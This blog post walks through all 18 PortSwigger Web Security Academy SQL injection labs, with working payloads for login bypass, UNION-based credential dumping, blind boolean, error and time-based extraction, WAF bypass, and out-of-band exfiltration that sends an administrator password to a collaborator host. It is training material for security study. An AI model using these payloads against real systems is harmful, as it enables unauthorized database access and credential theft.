---
title: Walkthrough - SQLi Portswigger labs 
date: 2025-10-02 3:30:00 + 05:30
categories: [Web, BSCP]
tags: [sqli, bscp]    # TAG names should always be lowercase
description: An intro to SQL injection and walkthrough of all 18 portswigger labs
---

This week, I completed all SQL injection labs on Portswigger to deepen my understanding of this critical web vulnerability. Below is a detailed explanation of SQL injection fundamentals followed by step-by-step walkthroughs for each lab.

## Everything about SQL Injection

##### 1. What is SQL Injection (SQLi)?

SQL injection is a web security vulnerability that allows attackers to interfere with database queries that an application makes. By injecting malicious SQL code into input fields, attackers can view, modify, or delete data they shouldn't have access to, potentially compromising the entire database and application.

##### 2. Types of SQL Injection

- In-band SQLi (Classic SQLi):
  - Union-based: Uses the UNION SQL operator to combine results from injected queries with the original query
  - Error-based: Relies on error messages from the database to extract information
  
- Inferential SQLi (Blind SQLi):
  - Boolean-based: Sends queries that return different responses based on TRUE/FALSE conditions
  - Time-based: Uses database commands that cause deliberate delays to infer information
  
- Out-of-band SQLi:
  - Relies on the database server's ability to make HTTP requests to exfiltrate data
  - Used when other techniques aren't viable due to server responses or rate limiting

##### 3. Common SQLi Techniques

- Authentication Bypass: Manipulating login queries to bypass password checks
- Data Extraction: Using UNION or error-based injection to retrieve sensitive data
- Database Enumeration: Identifying database version, structure, tables, and columns
- Conditional Responses: Exploiting boolean logic to extract data bit by bit
- Time Delays: Using database sleep functions to confirm vulnerabilities

##### 4. Database-Specific Syntax

- Oracle: Requires `FROM dual` in SELECT statements; uses `||` for concatenation
- MySQL/Microsoft: Uses `#` or `-- ` for comments; `@@version` for version info
- PostgreSQL: Supports `pg_sleep()` for time delays; uses `||` for concatenation
- Generic: `UNION SELECT`, `ORDER BY`, `WHERE`, `LIMIT` work across most databases

##### 5. Impact of SQL Injection

- Unauthorized access to sensitive data (credentials, personal information, financial records)
- Data modification or deletion
- Authentication and authorization bypass
- Denial of service through resource-intensive queries
- Complete server compromise in some cases
- Regulatory compliance violations and legal consequences

##### 6. Mitigations

- Parameterized Queries (Prepared Statements): Separate SQL code from data
- Input Validation: Whitelist acceptable input patterns
- Least Privilege: Database accounts should have minimal required permissions
- WAF (Web Application Firewall): Filter malicious SQL patterns
- Regular Security Audits: Test for SQLi vulnerabilities regularly
- Error Handling: Don't expose database errors to users

##### 7. Common Detection & Exploitation Tools

- Manual Testing: Using single quotes, SQL keywords, and logical operators
- Burp Suite: Intercepting and modifying requests, using Intruder for automation
- SQLMap: Automated SQL injection tool for detection and exploitation
- Collaborator/OAST: Out-of-band techniques for blind SQLi

## Labs

### 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Payload that worked:

```
' OR '1' ='1'-- -
```

Explanation:

Clicking on one of the options from the `Refine your search:` fills the `category` parameter. I chose `Gifts`.  

![](/assets/images/SQLi/Pasted%20image%2020250929135304.png)

Based on the hint and the lab description, we know that the SQL Statement looks something like this. 

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

By injecting the payload we can subvert the query logic. `OR 1=1` always returns true. This will cause the query to return `TRUE`. We will comment out the rest of the statement.

```
SELECT * FROM products WHERE category = 'Gifts' OR '1' ='1'-- -' AND released = 1
```

This is how the URL will look like, if we inject the payload through the URL in the browser.

```
https://0a71008003e2b89780d0585c00140016.web-security-academy.net/filter?category=Gifts%27%20OR%20%271%27%20=%20%271%27%20--%20-
```

I ended up URL encoding it. 

![](/assets/images/SQLi/Pasted%20image%2020250929135800.png)

The lab gets solved.

![](/assets/images/SQLi/Pasted%20image%2020250929135502.png)

### 2. SQL injection vulnerability allowing login bypass

Payloads that worked:

```
administrator' OR '1' = '1' -- -
```

```
administrator'-- -
```

Explanation:

I first tried to just put in a random password with username - `administrator`.

![](/assets/images/SQLi/Pasted%20image%2020250929140050.png)

If the query is anything like the one in Lab 1, we need to make it return `True`. Therefore, USERNAME with OR 1=1 returns `True`.

```
administrator' OR '1' = '1' -- -
```

This ends up working. In the hindsight, this is not because the query is returning `True` but instead it's because the password validation is getting broken/bypassed. 

![](/assets/images/SQLi/Pasted%20image%2020250929140138.png)

As per the solution, this is the payload that is supposed to work. 

```
administrator'-- -
```

The logic behind this is that Username is set to `Administrator` and the rest of the validation where the Password parameter is being checked in the backend DB.

So the query `SELECT * FROM DB WHERE USERNAME='Administrator' AND PASSWORD='password'` becomes - `SELECT * FROM DB WHERE USERNAME='Administrator'-- -' AND PASSWORD='password'` where the password validation gets subverted.

As we can see, even this works. 

![](/assets/images/SQLi/Pasted%20image%2020250929140531.png)

### 3. SQL injection attack, querying the database type and version on Oracle

Payload that worked:

```
' UNION SELECT banner, NULL FROM v$version-- -
```

Explanation:

From the question we know its an Oracle Database. We first select a random option for category.

![](/assets/images/SQLi/Pasted%20image%2020250929143522.png)

We first need to find the number of columns to exploit a UNION based SQLi. We will start from a single column. 

```
' UNION SELECT 'abc' FROM dual-- -
```

As we can see, the server threw an error meaning the number of columns is not equal to one.

![](/assets/images/SQLi/Pasted%20image%2020250929143714.png)

We will then try to exploit a UNION injection with two columns.

```
' UNION SELECT 'abc', 'def' FROM dual-- -
```

As we can see, it works and we are able to inject the strings. We can see that there are no errors.

![](/assets/images/SQLi/Pasted%20image%2020250929143929.png)

We will now use the following query to find the version which we can find from the SQL injection cheatsheet.

```
' UNION SELECT banner, NULL FROM v$version-- -
```

I ended up URL encoding the payload:

```
%27%20UNION%20SELECT%20%27abc%27,%20%27def%27%20FROM%20dual--%20-
```

The lab gets solved and I see I don't see the error from before.

![](/assets/images/SQLi/Pasted%20image%2020250929144355.png)

The database type and version are visible.

![](/assets/images/SQLi/Pasted%20image%2020250929144333.png)

### 4. SQL injection attack, querying the database type and version on MySQL and Microsoft

Payload that worked:

```
' UNION SELECT @@version, NULL -- -
```

Explanation:

As usual I pick a random option for the `category` parameter and send the request to repeater.

![](/assets/images/SQLi/Pasted%20image%2020250929213728.png)

I use the `ORDER BY` clause to find the number of columns. As we can see, there is no error when we send `ORDER BY 2`.

![](/assets/images/SQLi/Pasted%20image%2020250929213828.png)

Ignore this screenshot, as there is a mistake, `ORDER By 3` returned an error. Looks like I forgot to press send.

![](/assets/images/SQLi/Pasted%20image%2020250929213845.png)

We will now inject this query to extract the version.

```
' UNION SELECT @@version, NULL -- -
```

As we can see, we get a `200 OK`.

![](/assets/images/SQLi/Pasted%20image%2020250929214028.png)

We can see the database type and version.

![](/assets/images/SQLi/Pasted%20image%2020250929214103.png)

The lab gets solved.

![](/assets/images/SQLi/Pasted%20image%2020250929214127.png)

### 5. SQL injection attack, listing the database contents on non-Oracle databases

Payload that worked:

```
' UNION SELECT username_lfwbbn, password_mooevo FROM users_fuhvnz-- -
```

Explanation:

As before, we start by clicking on a random option to fill the `category` parameter. 

![](/assets/images/SQLi/Pasted%20image%2020250929214713.png)

Then we use the `ORDER BY` clause to check for the number of columns.

As we can see, `ORDER BY 2` returns a `200 OK`

![](/assets/images/SQLi/Pasted%20image%2020250929214734.png)

`ORDER BY 3` returns a `500 internal server error`

![](/assets/images/SQLi/Pasted%20image%2020250929214748.png)

This means that there are 2 columns that the query is returning.

We then use the following query to return the table names which may have the credentails we want.

```
' UNION SELECT table_name, NULL FROM information_schema.columns -- -
```

As we can see, the table names are returned. `users_fuhvnz` matches the 

![](/assets/images/SQLi/Pasted%20image%2020250929223725.png)

We can now inject this query to retrieve the names of the columns for the `users_fuhvnz` table.

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_fuhvnz'-- -
```

We found the `password_mooevo` column.

![](/assets/images/SQLi/Pasted%20image%2020250929223850.png)

We found the `username_lfwbbn` column.

![](/assets/images/SQLi/Pasted%20image%2020250929224004.png)

We can now use this query to find the usernames and passwords of all users.

```
' UNION SELECT username_lfwbbn, password_mooevo FROM users_fuhvnz-- -
```

We found the username `administrator` and the password for it.

![](/assets/images/SQLi/Pasted%20image%2020250929224116.png)

We use the credentials to login, which will solve the lab.

![](/assets/images/SQLi/Pasted%20image%2020250929224153.png)

### 6. SQL injection attack, listing the database contents on Oracle

Payload that worked:

```
' UNION SELECT USERNAME_PFKKLW, PASSWORD_PVZJRH FROM USERS_HAKECP -- - 
```

Explanation:

As before, we populate the `categories` parameter and send the request to repeater.

![](/assets/images/SQLi/Pasted%20image%2020250929225756.png)

We use the below query to find the table names.

```
' UNION SELECT table_name, null FROM all_tables-- -
```

We found the table `USERS_HAKECP`.

![](/assets/images/SQLi/Pasted%20image%2020250929231240.png)

We then try to find the column names with this query.

```
' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_HAKECP' -- - 
```

We found the column `PASSWORD_PVZJRH`.

![](/assets/images/SQLi/Pasted%20image%2020250929232336.png)

We found the column `USERNAME_PFKKLW`.

![](/assets/images/SQLi/Pasted%20image%2020250929232355.png)

Finally we use this query to leak the credentials of users.

```
' UNION SELECT USERNAME_PFKKLW, PASSWORD_PVZJRH FROM USERS_HAKECP -- - 
```

We find the `administrator` user's password.

![](/assets/images/SQLi/Pasted%20image%2020250929232451.png)

We use the creds to login, solving the lab.

![](/assets/images/SQLi/Pasted%20image%2020250929232613.png)

### 7. SQL injection UNION attack, determining the number of columns returned by the query

Payload that worked:

```
' UNION SELECT NULL, NULL, NULL-- -
```

Explanation:

As before, we make sure the `category` parameter sends some value and we send the request to repeater.

![](/assets/images/SQLi/Pasted%20image%2020250930124349.png)

We try to find the number of columns using the `ORDER BY` clause. `ORDER BY 3` had worked.

```
' ORDER BY 4-- -
```

`ORDER BY 4` failed. That means there are 3 columns. 

![](/assets/images/SQLi/Pasted%20image%2020250930124644.png)

We need to include some values in order to solve the lab so we use three NULL values in the UNION injection.

```
' UNION SELECT NULL, NULL, NULL-- -
```

It works, and we get a `200 OK`.

![](/assets/images/SQLi/Pasted%20image%2020250930124914.png)

The lab gets solved.

![](/assets/images/SQLi/Pasted%20image%2020250930124956.png)

### 8. SQL injection UNION attack, finding a column containing text

Payload that worked:

```
' UNION SELECT NULL, 'Bpcp2PS', NULL-- -
```

Explanation:

As before, we make sure the `category` parameter sends some value and we send the request to repeater.

![](/assets/images/SQLi/Pasted%20image%2020250930125140.png)

We try to find the number of columns using the `ORDER BY` clause. `ORDER BY 3` had worked.

```
' ORDER BY 4-- -
```

`ORDER BY 4` failed. That means there are 3 columns. 

![](/assets/images/SQLi/Pasted%20image%2020250930125221.png)

We use the following query where we put in a random string in place of the `NULL` in the queries. 

This query where the string in the second position from the three positions.

```
' UNION SELECT NULL, 'hello', NULL-- -
```

As we can see it works.

![](/assets/images/SQLi/Pasted%20image%2020250930125440.png)

We can try other positions. 

```
' UNION SELECT 'hello', NULL, NULL-- -
```

But as we can see, it returns a `500 internal server error`.

![](/assets/images/SQLi/Pasted%20image%2020250930125525.png)

Now that we know that the second position returns strings, we can use it to return the string from the question using this query.

```
' UNION SELECT NULL, 'Bpcp2PS', NULL-- -
```

As we can see it worked.

![](/assets/images/SQLi/Pasted%20image%2020250930125743.png)

It works, and the lab gets solved.

![](/assets/images/SQLi/Pasted%20image%2020250930125759.png)

### 9. SQL injection UNION attack, retrieving data from other tables

Payload that worked:

```
' UNION SELECT username, password FROM users-- -
```

Explanation:

We know the table name and the column names from the question.

We fill in a random option for the `category` parameter now.

![](/assets/images/SQLi/Pasted%20image%2020250930131034.png)

We use the `ORDER BY` clause to figure out the number of columns. We see that `ORDER BY 3` failed. 

![](/assets/images/SQLi/Pasted%20image%2020250930131053.png)

`ORDER BY 2` works so we know that the original query is returning two columns.

![](/assets/images/SQLi/Pasted%20image%2020250930131111.png)

We use this query to get the credentials.

```
' UNION SELECT username, password FROM users-- -
```

We can see the Administrator's credentials.

![](/assets/images/SQLi/Pasted%20image%2020250930131418.png)

We can use the credentials to login and this solves the lab.

![](/assets/images/SQLi/Pasted%20image%2020250930131452.png)

### 10. SQL injection UNION attack, retrieving multiple values in a single column

Payload that worked:

```
' UNION SELECT NULL, username||' '||password FROM users-- -
```

Explanation:

As usual, we start with intercepting a request with the `category` parameter.

![](/assets/images/SQLi/Pasted%20image%2020250930131900.png)

Next, we use the `ORDER BY` clause to find the number of columns being returned.

```
' ORDER BY 2-- -
```

As we can see, it `ORDER BY 2` works which shows that there are two columns.

![](/assets/images/SQLi/Pasted%20image%2020250930132319.png)

Now even though there are two columns being returned by the back-end, there is only one column being shown on the front-end. 

Next, we need to find which column is returning the information to the front-end using the given query.

We first check the first column. 

```
' UNION SELECT 'text', NULL FROM users-- -
```

Since it returns a `500 internal server error`, we know it is not returning text.

![](/assets/images/SQLi/Pasted%20image%2020250930133114.png)

We check the second position next.

```
' UNION SELECT NULL, 'text' FROM users-- -
```

This returns a `200 OK`. It means that the second column is returning strings.

![](/assets/images/SQLi/Pasted%20image%2020250930133051.png)

We use string concatenation to get output for both the username and password columns in a single column.

```
' UNION SELECT NULL, username||' '||password FROM users-- -
```

We get the administrator's credentials.

![](/assets/images/SQLi/Pasted%20image%2020250930133410.png)

Logging in with these credentials solves the lab.

![](/assets/images/SQLi/Pasted%20image%2020250930133436.png)

### 11. Blind SQL injection with conditional responses

Payload that worked:

```
' AND ((SELECT SUBSTRING(password,XXX,1) from users where username='administrator')) = 'xxx'-- -
```

Explanation:

In this lab, if the condition is true, the page returns a `Welcome Back!` message.

We start as usual by intercepting a request with the `category` parameter. However, it isn't necessary here, as it is the `TrackingId` cookie which is vulnerable to SQLi.

![](/assets/images/SQLi/Pasted%20image%2020250930134321.png)

Using a simple `AND 1=1-- -` to validate that the cookie is indeed vulnerable.

![](/assets/images/SQLi/Pasted%20image%2020250930134417.png)

We can use `AND 1=2-- -` and see that it doesn't return a `Welcome Back!` message. 

![](/assets/images/SQLi/Pasted%20image%2020250930134459.png)

Now we will try to extract data using the SQLi. This payload just selects the letter `a` and returns true.

```
' AND (SELECT 'a' from users LIMIT 1) = 'a'-- -
```

We can see that it works.

![](/assets/images/SQLi/Pasted%20image%2020250930161236.png)

We can now see if the first username in the users table is `administrator`

```
' AND (SELECT username from users LIMIT 1) = 'administrator'-- -
```

We are able to verify that `administrator` is indeed the first username.

![](/assets/images/SQLi/Pasted%20image%2020250930161504.png)

Now in order to get the password, we need to select the password string and check every character against a wordlist. First we need to find the length of the password. I crafted this query to first test it with the administrator username.

```
' AND LENGTH((SELECT username from users where username='administrator')) = 13-- -
```

As we can see that it works.

![](/assets/images/SQLi/Pasted%20image%2020250930162851.png)

Now I used this query to find the lenght of the password.

```
' AND LENGTH((SELECT password from users where username='administrator')) = XX-- -;
```

I used a wordlist of numbers 1-25 and ran these using Burp intruder.

![](/assets/images/SQLi/Pasted%20image%2020250930163328.png)

As we can see the password is 20 characters long.

![](/assets/images/SQLi/Pasted%20image%2020250930163218.png)

Next we need to use the `SUBSTRING` function to extract a single character at a particular location and check if it is equal to what character from the wordlist. 

```
' AND ((SELECT SUBSTRING(password,1,1) from users where username='administrator')) = 'XXX'-- -
```

I ran this using a wordlist containing all characters, A-Z and a-z and 0-9 using Intruders.

![](/assets/images/SQLi/Pasted%20image%2020250930164504.png)

It works as we see that the first character of the password is `n`.

![](/assets/images/SQLi/Pasted%20image%2020250930164352.png)

I then ran this query via intruder. Where each character is checked against each position.

```
' AND ((SELECT SUBSTRING(password,XXX,1) from users where username='administrator')) = 'xxx'-- -
```

We use the Cluster bomb attack.

![](/assets/images/SQLi/Pasted%20image%2020250930165341.png)

Sorting the responses reveals each character of the password.

![](/assets/images/SQLi/Pasted%20image%2020250930165042.png)

Logging in with the credentials works and the lab gets solved.

![](/assets/images/SQLi/Pasted%20image%2020250930165310.png)

### 12. Blind SQL injection with conditional errors

Payload that worked:

```
'||(SELECT CASE WHEN ((SELECT SUBSTR(password,X,1) FROM users WHERE username='administrator')='X') THEN TO_CHAR(1/0) ELSE '' END FROM dual)-- -
```

Explanation:

In this lab, the cookie is again vulnerable to SQLi but there are no conditional responses. Instead we can trigger errors to leak data. If the condition is true, then the server returns a `500 internal server error`.

```
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)--
```

As we can see, the condition is false, so it returns a `200 OK`.

![](/assets/images/SQLi/Pasted%20image%2020250930174011.png)

Now we use this query to leak data. In this query we will check if `administrator` is a valid username or not.

```
'||(SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM dual)-- -
```

Since administrator is a valid username, it returns `500 internal error`.  

![](/assets/images/SQLi/Pasted%20image%2020250930173947.png)

We can change the `administrator` to `administrator`. Now it returns `200 OK`.

![](/assets/images/SQLi/Pasted%20image%2020250930173919.png)

Now we use this query to determine the lenght of the password.

```
'||(SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')=X) THEN TO_CHAR(1/0) ELSE '' END FROM dual)-- -
```

Like before, we run 1-25 queries like before using intruder.

![](/assets/images/SQLi/Pasted%20image%2020250930175045.png)

Sorting the responses reveals that the length of password is 20.

![](/assets/images/SQLi/Pasted%20image%2020250930174957.png)

Now we using the `SUBSTR` function to determine each of the character of the password.

```
'||(SELECT CASE WHEN ((SELECT SUBSTR(password,X,1) FROM users WHERE username='administrator')='X') THEN TO_CHAR(1/0) ELSE '' END FROM dual)-- -
```

We find the first character of the password.

![](/assets/images/SQLi/Pasted%20image%2020250930174602.png)

We then sort the responses and find the response.

![](/assets/images/SQLi/Pasted%20image%2020250930175144.png)

Running a cluster bomb attack like before, reveals the entire password.

![](/assets/images/SQLi/Pasted%20image%2020250930175627.png)

Logging in with the password solves the lab.

![](/assets/images/SQLi/Pasted%20image%2020250930175655.png)

### 13. Visible error-based SQL injection

Payload that worked:

```
' OR CAST((SELECT password FROM users LIMIT 1) AS int)=1 -- -
```

Explanation:

We intercept a request like before.

![](/assets/images/SQLi/Pasted%20image%2020250930182048.png)

Intercepting the request and putting in a `'` in the `trackingId` cookie causes an error showing the entire query.

![](/assets/images/SQLi/Pasted%20image%2020250930182125.png)

We can see the errors in the repeater tab as well.

![](/assets/images/SQLi/Pasted%20image%2020250930182240.png)

We try to cast a string as an int to trigger an error that should reveal the data.

```
ekr5zVx74NqWewAz'+AND+SELECT+CAST((SELECT+username+FROM+users+LIMIT+1)+AS+int)+--+-;
```

But this fails, as there is probably a limit to the query.

![](/assets/images/SQLi/Pasted%20image%2020250930182520.png)

We can delete the cookie and send the request again.

```
' OR CAST((SELECT username FROM users LIMIT 1) AS int)=1 -- -
```

This reveals that the username is administrator.

![](/assets/images/SQLi/Pasted%20image%2020250930182815.png)

Changing the username to password in query leaks the administrator's passwords.

![](/assets/images/SQLi/Pasted%20image%2020250930182914.png)

Logging in with these credentials will solve the lab.

![](/assets/images/SQLi/Pasted%20image%2020250930182939.png)

### 14. Blind SQL injection with time delays

Payload that worked:

'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--

Explanation:

We use the following payload to trigger a 10 second delay. If the condition is true, then there should be a delay, which becomes true.

```
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

We intercept the request and send it using repeater.

![](/assets/images/SQLi/Pasted%20image%2020250930234127.png)

This solves the lab.

![](/assets/images/SQLi/Pasted%20image%2020250930234145.png)

### 15. Blind SQL injection with time delays and information retrieval

Payload that worked:

```
'||(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),X,1)='X')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```

Explanation:

I started the lab by triggering a time delay. The following payload works as admdinistrator is 13 characters long.

```
'||(SELECT+CASE+WHEN+((LENGTH((SELECT+username+FROM+users+where+username='administrator')))=13)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```

Since the previous passwords were 20 character's long, I checked directly for it to be 20 character's long. 

![](/assets/images/SQLi/Pasted%20image%2020251001000849.png)

```
'||(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),X,1)='X')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```

I used the intruder like before to send requests. Make sure to use a single thread from the intruder resource pool.

![](/assets/images/SQLi/Pasted%20image%2020251001005628.png)

Sorting the responses reveals the password.

![](/assets/images/SQLi/Pasted%20image%2020251001005840.png)

Logging in with the credentials solves the lab.

![](/assets/images/SQLi/Pasted%20image%2020251001005853.png)

### 16. Blind SQL injection with out-of-band interaction

Payload that worked:

```
UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//2dg3tlhq00xkk4hc76kbdxcm5db4zunj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--+-
```

Explanation:

I have already written about Blind SQLi with out of band interaction. I used the payload from the SQLi cheatsheet to trigger a response to the collaborator. 

```
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://2dg3tlhq00xkk4hc76kbdxcm5db4zunj.oastify.com/"> %remote;]>'),'/l') FROM dual-- -
```

The query is required to be URL encoded. Especially special characters like `=`, `?`, etc.

```
UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//2dg3tlhq00xkk4hc76kbdxcm5db4zunj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--+-
```

We can send the request using repeater.

![](/assets/images/SQLi/Pasted%20image%2020251001144053.png)

We get a hit on the collaborator.

![](/assets/images/SQLi/Pasted%20image%2020251001144107.png)

The lab gets solved as soon as we see a response on the collaborator.

![](/assets/images/SQLi/Pasted%20image%2020251001144124.png)

### 17. Blind SQL injection with out-of-band data exfiltration

Payload that worked:

```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ybdste9254tz2gpasecdygvolfr6fw3l.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--+-
```

Explanation:

Again, the payload from SQLi cheatsheet was used and special characters like `=`, `?`, etc were URL-encoded.

```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ybdste9254tz2gpasecdygvolfr6fw3l.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--+-
```

The request can be sent through repeater.

![](/assets/images/SQLi/Pasted%20image%2020251001192441.png)

We can see the password in the response in PASSWORD.SUBDOMAIN.oastify.com

![](/assets/images/SQLi/Pasted%20image%2020251001192644.png)

Logging in with the password solves the lab.

![](/assets/images/SQLi/Pasted%20image%2020251001192625.png)

### 18. SQL injection with filter bypass via XML encoding

Payload that worked:

```
<@hex_entities>
1 UNION SELECT password from users where username='administrator';
</@hex_entities>
```

Explanation:

We first open a random product.

![](/assets/images/SQLi/Pasted%20image%2020251001193824.png)

There is a check stock option. Clicking on that reveals the stock number.

![](/assets/images/SQLi/Pasted%20image%2020251001193856.png)

It looks like there is a stock API. Based on the question we know, storeID is vulnerable to SQLi.

![](/assets/images/SQLi/Pasted%20image%2020251001193924.png)

Trying to find the number of columns shows that the payload is getting detected by WAF.

![](/assets/images/SQLi/Pasted%20image%2020251001194103.png)

The solution says we should use the Hackverter extension to get encode the payload to exploit the SQLi.

![](/assets/images/SQLi/Pasted%20image%2020251001194307.png)

We can then exploit the UNION injection to find usernames from user tables.

![](/assets/images/SQLi/Pasted%20image%2020251001195046.png)

We can now get the password where username='administrator'. 

![](/assets/images/SQLi/Pasted%20image%2020251001195130.png)

Logging in with creds, solves the lab.

![](/assets/images/SQLi/Pasted%20image%2020251001195156.png)

## Conclusion

These 18 labs provided comprehensive coverage of SQL injection techniques, from basic UNION attacks to advanced blind SQLi with out-of-band data exfiltration. Key takeaways include:

- Understanding how to identify the number of columns and data types in SQL queries
- Mastering database-specific syntax differences (Oracle, MySQL, PostgreSQL)
- Developing skills in blind SQLi techniques using boolean conditions, time delays, and error-based extraction
- Learning to bypass WAFs using encoding techniques
- Recognizing the importance of out-of-band channels when traditional methods fail

SQL injection remains one of the most dangerous web vulnerabilities despite being well-documented. The practical experience from these labs reinforced the importance of using parameterized queries and proper input validation in all database interactions. Moving forward, I'll continue exploring advanced web vulnerabilities and working toward completing the BSCP certification path